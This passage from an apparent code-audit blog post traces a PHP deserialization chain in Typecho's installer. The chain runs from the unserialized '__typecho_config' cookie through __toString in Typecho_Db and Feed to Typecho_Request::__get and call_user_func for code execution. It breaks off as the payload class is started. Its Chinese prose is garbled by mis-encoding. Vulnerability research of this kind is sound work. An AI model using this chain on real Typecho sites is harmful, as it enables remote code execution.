class="title">body</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">post</span>&quot; <span class="title">action</span>=&quot;?<span class="title">config</span>&quot; <span class="title">name</span>=&quot;<span class="title">config</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">p</span> <span class="title">class</span>=&quot;<span class="title">message</span> <span class="title">error</span>&quot;&gt;&lt;?<span class="title">php</span> <span class="title">_e</span>(&#x27;æ‚¨æ²¡æœ‰è¿›è¡Œå®‰è£…é…ç½®ï¼Œè¯·æ£€æŸ¥åå†è¯•ï¼&#x27;); ?&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">primary</span>&quot; <span class="title">type</span>=&quot;<span class="title">submit</span>&quot;&gt;&lt;?<span class="title">php</span> <span class="title">_e</span>(&#x27;é‡æ–°å®‰è£…&#x27;); ?&gt;&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span> <span class="title">else</span> : ?&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span> <span class="title">endif</span>; ?&gt;</span></span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªifåˆ¤æ–­ <strong>$_GET[â€˜finishâ€™]</strong> æ˜¯å¦è®¾ç½®ï¼Œç„¶ååˆ¤æ–­ <strong>config.inc.phpæ–‡ä»¶</strong> æ˜¯å¦å­˜åœ¨ï¼Œå®‰è£…åå·²å­˜åœ¨ï¼Œç¬¬ä¸‰ä¸ªåˆ¤æ–­cookieä¸­ <strong>__typecho_config</strong> å‚æ•°æ˜¯å¦ä¸ºç©ºï¼Œä¸ä¸ºç©ºã€‚è¿›å…¥elseåˆ†æ”¯ã€‚ç»¼ä¸Šï¼Œå…·ä½“æ„é€ å¦‚ä¸‹å›¾ï¼š</p><p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-18.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$config</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title class_">Typecho_Cookie</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;__typecho_config&#x27;</span>)));</span><br><span class="line"><span class="title class_">Typecho_Cookie</span>::<span class="title function_ invoke__">delete</span>(<span class="string">&#x27;__typecho_config&#x27;</span>);</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">Typecho_Db</span>(<span class="variable">$config</span>[<span class="string">&#x27;adapter&#x27;</span>], <span class="variable">$config</span>[<span class="string">&#x27;prefix&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>ååºåˆ—åŒ–ç»“æœå­˜å‚¨åˆ° <strong>$config</strong> å˜é‡ä¸­ï¼Œç„¶åå°† <strong>$config[â€˜adapterâ€™]</strong> å’Œ <strong>$config[â€˜prefixâ€™]</strong> ä½œä¸º <strong>Typecho_Db</strong> ç±»çš„åˆå§‹åŒ–å˜é‡åˆ›å»ºç±»å®ä¾‹ã€‚æˆ‘ä»¬å¯ä»¥åœ¨ <strong>var&#x2F;Typecho&#x2F;Db.php</strong> æ–‡ä»¶ä¸­æ‰¾åˆ°è¯¥ç±»æ„é€ å‡½æ•°ä»£ç ï¼Œå…·ä½“å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$adapterName</span>, <span class="variable">$prefix</span> = <span class="string">&#x27;typecho_&#x27;</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">/** è·å–é€‚é…å™¨åç§° */</span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;_adapterName = <span class="variable">$adapterName</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** æ„å»ºé€‚é…å™¨å®Œæ•´åç§° */</span></span><br><span class="line">    <span class="variable">$adapterName</span> = <span class="string">&#x27;Typecho_Db_Adapter_&#x27;</span> . <span class="variable">$adapterName</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">call_user_func</span>(<span class="keyword">array</span>(<span class="variable">$adapterName</span>, <span class="string">&#x27;isAvailable&#x27;</span>))) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Typecho_Db_Exception</span>(<span class="string">&quot;Adapter <span class="subst">&#123;$adapterName&#125;</span> is not available&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;_prefix = <span class="variable">$prefix</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** åˆå§‹åŒ–å†…éƒ¨å˜é‡ */</span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;_pool = <span class="keyword">array</span>();</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;_connectedPool = <span class="keyword">array</span>();</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;_config = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** å®ä¾‹åŒ–é€‚é…å™¨å¯¹è±¡ */</span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;_adapter = <span class="keyword">new</span> <span class="variable">$adapterName</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šå›¾ä»£ç  <strong>ç¬¬6è¡Œ</strong> ï¼Œå¯¹ä¼ å…¥çš„ <strong>$adapterName</strong> å˜é‡è¿›è¡Œäº†å­—ç¬¦ä¸²æ‹¼æ¥æ“ä½œï¼Œå¯¹äºPHPè€Œè¨€ï¼Œå¦‚æœ <strong>$adapterName</strong> ç±»å‹ä¸ºå¯¹è±¡ï¼Œåˆ™ä¼šè°ƒç”¨è¯¥ç±» <strong>__toString()</strong> é­”æœ¯æ–¹æ³•ã€‚å¯ä½œä¸ºååºåˆ—åŒ–çš„ä¸€ä¸ªè§¦å‘ç‚¹ï¼Œæˆ‘ä»¬å…¨å±€æœç´¢ä¸€ä¸‹ <strong>__toString()</strong> ï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰å¯åˆ©ç”¨çš„ç‚¹ã€‚å®é™…æœç´¢æ—¶ï¼Œä¼šå‘ç°æœ‰ä¸‰ä¸ªç±»éƒ½å®šä¹‰äº† <strong>__toString()</strong> æ–¹æ³•ï¼š</p><p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-19.png"></p><ul><li><p>ç¬¬ä¸€å¤„ <strong>var\Typecho\Config.php</strong>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$this</span>-&gt;currentConfig);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è°ƒç”¨ <strong>serialize()</strong> å‡½æ•°è¿›è¡Œåºåˆ—åŒ–æ“ä½œï¼Œä¼šè‡ªåŠ¨è§¦å‘ <strong>__sleep()</strong> ï¼Œå¦‚æœå­˜åœ¨å¯åˆ©ç”¨çš„ <strong>__sleep()</strong> ï¼Œåˆ™å¯ä»¥è¿›ä¸€æ­¥åˆ©ç”¨ã€‚</p></li><li><p>ç¬¬äºŒå¤„ <strong>var\Typecho\Db\Query.php</strong>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">switch</span> (<span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;action&#x27;</span>]) &#123;</span><br><span class="line">          <span class="keyword">case</span> <span class="title class_">Typecho_Db</span>::<span class="variable constant_">SELECT</span>:</span><br><span class="line">              <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;_adapter-&gt;<span class="title function_ invoke__">parseSelect</span>(<span class="variable">$this</span>-&gt;_sqlPreBuild);</span><br><span class="line">          <span class="keyword">case</span> <span class="title class_">Typecho_Db</span>::<span class="variable constant_">INSERT</span>:</span><br><span class="line">              <span class="keyword">return</span> <span class="string">&#x27;INSERT INTO &#x27;</span> .</span><br><span class="line">                  <span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;table&#x27;</span>] .</span><br><span class="line">                  <span class="string">&#x27; (&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;, &#x27;</span>, <span class="title function_ invoke__">array_keys</span>(<span class="variable">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>])) . <span class="string">&#x27;)&#x27;</span> .</span><br><span class="line">                  <span class="string">&#x27; VALUES &#x27;</span> .</span><br><span class="line">                  <span class="string">&#x27;(&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;, &#x27;</span>, <span class="title function_ invoke__">array_values</span>(<span class="variable">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>])) . <span class="string">&#x27;)&#x27;</span> .</span><br><span class="line">                  <span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;limit&#x27;</span>];</span><br><span class="line">          <span class="keyword">case</span> <span class="title class_">Typecho_Db</span>::<span class="variable constant_">DELETE</span>:</span><br><span class="line">              <span class="keyword">return</span> <span class="string">&#x27;DELETE FROM &#x27;</span> .</span><br><span class="line">                  <span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;table&#x27;</span>] .</span><br><span class="line">                  <span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;where&#x27;</span>];</span><br><span class="line">          <span class="keyword">case</span> <span class="title class_">Typecho_Db</span>::<span class="variable constant_">UPDATE</span>:</span><br><span class="line">              <span class="variable">$columns</span> = <span class="keyword">array</span>();</span><br><span class="line">              <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>])) &#123;</span><br><span class="line">                  <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>] <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">                      <span class="variable">$columns</span>[] = <span class="string">&quot;<span class="subst">$key</span> = <span class="subst">$val</span>&quot;</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">return</span> <span class="string">&#x27;UPDATE &#x27;</span> .</span><br><span class="line">                  <span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;table&#x27;</span>] .</span><br><span class="line">                  <span class="string">&#x27; SET &#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;, &#x27;</span>, <span class="variable">$columns</span>) .</span><br><span class="line">                  <span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;where&#x27;</span>];</span><br><span class="line">          <span class="keyword">default</span>:</span><br><span class="line">              <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>è¯¥æ–¹æ³•ç”¨äºæ„å»ºSQLè¯­å¥ï¼Œå¹¶æ²¡æœ‰æ‰§è¡Œæ•°æ®åº“æ“ä½œï¼Œæ‰€ä»¥æš‚æ— åˆ©ç”¨ä»·å€¼ã€‚</p></li><li><p>ç¬¬ä¸‰å¤„<strong>var\Typecho\Feed.php</strong>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="variable">$result</span> = <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;&#x27;</span> . <span class="variable language_">$this</span>-&gt;charset . <span class="string">&#x27;&quot;?&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">self</span>::<span class="variable constant_">RSS1</span> == <span class="variable language_">$this</span>-&gt;_type) &#123;</span><br><span class="line">          ......</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">self</span>::<span class="variable constant_">RSS2</span> == <span class="variable language_">$this</span>-&gt;_type) &#123;</span><br><span class="line">          <span class="variable">$result</span> .= <span class="string">&#x27;&lt;rss version=&quot;2.0&quot;</span></span><br><span class="line"><span class="string">              xmlns:content=&quot;http://purl.org/rss/1.0/modules/content/&quot;</span></span><br><span class="line"><span class="string">              xmlns:dc=&quot;http://purl.org/dc/elements/1.1/&quot;</span></span><br><span class="line"><span class="string">              xmlns:slash=&quot;http://purl.org/rss/1.0/modules/slash/&quot;</span></span><br><span class="line"><span class="string">              xmlns:atom=&quot;http://www.w3.org/2005/Atom&quot;</span></span><br><span class="line"><span class="string">              xmlns:wfw=&quot;http://wellformedweb.org/CommentAPI/&quot;&gt;</span></span><br><span class="line"><span class="string">              &lt;channel&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">          <span class="variable">$content</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">          <span class="variable">$lastUpdate</span> = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;_items <span class="keyword">as</span> <span class="variable">$item</span>) &#123;</span><br><span class="line">              <span class="variable">$content</span> .= <span class="string">&#x27;&lt;item&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">              <span class="variable">$content</span> .= <span class="string">&#x27;&lt;title&gt;&#x27;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$item</span>[<span class="string">&#x27;title&#x27;</span>]) . <span class="string">&#x27;&lt;/title&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">              <span class="variable">$content</span> .= <span class="string">&#x27;&lt;link&gt;&#x27;</span> . <span class="variable">$item</span>[<span class="string">&#x27;link&#x27;</span>] . <span class="string">&#x27;&lt;/link&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">              <span class="variable">$content</span> .= <span class="string">&#x27;&lt;guid&gt;&#x27;</span> . <span class="variable">$item</span>[<span class="string">&#x27;link&#x27;</span>] . <span class="string">&#x27;&lt;/guid&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">              <span class="variable">$content</span> .= <span class="string">&#x27;&lt;pubDate&gt;&#x27;</span> . <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">dateFormat</span>(<span class="variable">$item</span>[<span class="string">&#x27;date&#x27;</span>]) . <span class="string">&#x27;&lt;/pubDate&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">              <span class="variable">$content</span> .= <span class="string">&#x27;&lt;dc:creator&gt;&#x27;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$item</span>[<span class="string">&#x27;author&#x27;</span>]-&gt;screenName) . <span class="string">&#x27;&lt;/dc:creator&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">              <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$item</span>[<span class="string">&#x27;category&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$item</span>[<span class="string">&#x27;category&#x27;</span>])) &#123;</span><br><span class="line">                  <span class="keyword">foreach</span> (<span class="variable">$item</span>[<span class="string">&#x27;category&#x27;</span>] <span class="keyword">as</span> <span class="variable">$category</span>) &#123;</span><br><span class="line">                      <span class="variable">$content</span> .= <span class="string">&#x27;&lt;category&gt;&lt;![CDATA[&#x27;</span> . <span class="variable">$category</span>[<span class="string">&#x27;name&#x27;</span>] . <span class="string">&#x27;]]&gt;&lt;/category&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          ......</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>åœ¨ä»£ç  <strong>19è¡Œ</strong> ï¼Œ <strong>$this-&gt;_items</strong> ä¸ºç±»å˜é‡ï¼Œååºåˆ—åŒ–å¯æ§ï¼Œåœ¨ä»£ç  <strong>27è¡Œ</strong> ï¼Œ <strong>$item[â€˜authorâ€™]-&gt;screenName</strong> ï¼Œå¦‚æœ <strong>$item[â€˜authorâ€™]</strong> ä¸­å­˜å‚¨çš„ç±»æ²¡æœ‰â€™screenNameâ€™å±æ€§æˆ–è¯¥å±æ€§ä¸ºç§æœ‰å±æ€§ï¼Œæ­¤æ—¶ä¼šè§¦å‘è¯¥ç±»ä¸­çš„ <strong>__get()</strong> é­”æ³•æ–¹æ³•ï¼Œè¿™ä¸ªå¯ä½œä¸ºè¿›ä¸€æ­¥åˆ©ç”¨çš„ç‚¹ï¼Œç»§ç»­å¾€ä¸‹çœ‹ä»£ç ï¼Œæœªå‘ç°æœ‰å±é™©å‡½æ•°çš„è°ƒç”¨ã€‚</p></li></ul><p>è®°ä¸€æ³¢é­”æœ¯æ–¹æ³•åŠå¯¹åº”çš„è§¦å‘æ¡ä»¶ï¼Œå…·ä½“å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__wakeup</span>() <span class="comment">//ä½¿ç”¨unserializeæ—¶è§¦å‘</span></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>() <span class="comment">//ä½¿ç”¨serializeæ—¶è§¦å‘</span></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>() <span class="comment">//å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘</span></span><br><span class="line"><span class="title function_ invoke__">__call</span>() <span class="comment">//åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span></span><br><span class="line"><span class="title function_ invoke__">__callStatic</span>() <span class="comment">//åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span></span><br><span class="line"><span class="title function_ invoke__">__get</span>() <span class="comment">//ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®</span></span><br><span class="line"><span class="title function_ invoke__">__set</span>() <span class="comment">//ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§</span></span><br><span class="line"><span class="title function_ invoke__">__isset</span>() <span class="comment">//åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘</span></span><br><span class="line"><span class="title function_ invoke__">__unset</span>() <span class="comment">//åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘</span></span><br><span class="line"><span class="title function_ invoke__">__toString</span>() <span class="comment">//æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘</span></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>() <span class="comment">//å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘</span></span><br></pre></td></tr></table></figure><p>åœ¨ <strong>var&#x2F;Typecho&#x2F;Request.php</strong> çš„  <strong>Typecho_Request</strong> ç±»ä¸­ï¼Œæˆ‘ä»¬å‘ç° <strong>__get()</strong> æ–¹æ³•ï¼Œè·Ÿè¸ªè¯¥æ–¹æ³•çš„è°ƒç”¨ï¼Œå…·ä½“å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_applyFilter</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;_filter) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;_filter <span class="keyword">as</span> <span class="variable">$filter</span>) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="title function_ invoke__">is_array</span>(<span class="variable">$value</span>) ? <span class="title function_ invoke__">array_map</span>(<span class="variable">$filter</span>, <span class="variable">$value</span>) : <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$filter</span>, <span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;_filter = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$key</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$key</span>, <span class="variable">$default</span> = <span class="literal">NULL</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;_params[<span class="variable">$key</span>]):</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;_params[<span class="variable">$key</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">isset</span>(<span class="built_in">self</span>::<span class="variable">$_httpParams</span>[<span class="variable">$key</span>]):</span><br><span class="line">            <span class="variable">$value</span> = <span class="built_in">self</span>::<span class="variable">$_httpParams</span>[<span class="variable">$key</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable">$default</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$value</span> = !<span class="title function_ invoke__">is_array</span>(<span class="variable">$value</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$value</span>) &gt; <span class="number">0</span> ? <span class="variable">$value</span> : <span class="variable">$default</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_applyFilter</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <strong>array_map()</strong> å‡½æ•°å’Œ <strong>call_user_func</strong> å‡½æ•°ï¼Œéƒ½å¯ä»¥ä½œä¸ºåˆ©ç”¨ç‚¹ï¼Œ**$filter** ä½œä¸ºè°ƒç”¨å‡½æ•°ï¼Œ**$value** ä¸ºå‡½æ•°å‚æ•°ï¼Œè·Ÿè¸ªå˜é‡,çœ‹ä¸€ä¸‹æ˜¯å¦å¯æ§ã€‚è¿™ä¸¤ä¸ªå˜é‡éƒ½æ¥æºäºç±»å˜é‡ï¼Œååºåˆ—åŒ–å¯æ§ã€‚ä»ä¸Šé¢çš„åˆ†æä¸­ï¼Œå¯çŸ¥å½“ <strong>$item[â€˜authorâ€™]</strong> æ»¡è¶³ä¸€å®šæ¡ä»¶ä¼šè§¦å‘ <strong>__get</strong> æ–¹æ³•ã€‚</p><p>å‡è®¾ <strong>$item[â€˜authorâ€™]</strong> ä¸­å­˜å‚¨ <strong>Typecho_Request</strong> ç±»å®ä¾‹ï¼Œæ­¤æ—¶è°ƒç”¨ <strong>$item[â€˜authorâ€™]-&gt;screenName</strong> ï¼Œåœ¨<strong>Typecho_Request</strong> ç±»ä¸­æ²¡æœ‰è¯¥å±æ€§ï¼Œå°±ä¼šè°ƒç”¨ç±»ä¸­çš„ <strong>__get($key)</strong> æ–¹æ³•ï¼Œ**$key** ä¼ å…¥çš„å€¼ä¸º <strong>scrrenName</strong> ã€‚å‚æ•°ä¼ é€’è¿‡ç¨‹å¦‚ä¸‹ï¼š<code>$key=&#39;scrrenName&#39;</code>&#x3D;&gt;<code>$this-&gt;_param[$key]</code>&#x3D;&gt;<code>$value</code></p><p>æˆ‘ä»¬å°† <strong>$this-&gt;_param[â€˜scrrenNameâ€™]</strong> çš„å€¼è®¾ç½®ä¸ºæƒ³è¦æ‰§è¡Œçš„å‡½æ•°ï¼Œæ„é€  <strong>$this-&gt;_filter</strong> ä¸ºå¯¹åº”å‡½æ•°çš„å‚æ•°å€¼ï¼Œå…·ä½“æ„é€ å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_params</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_filter</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    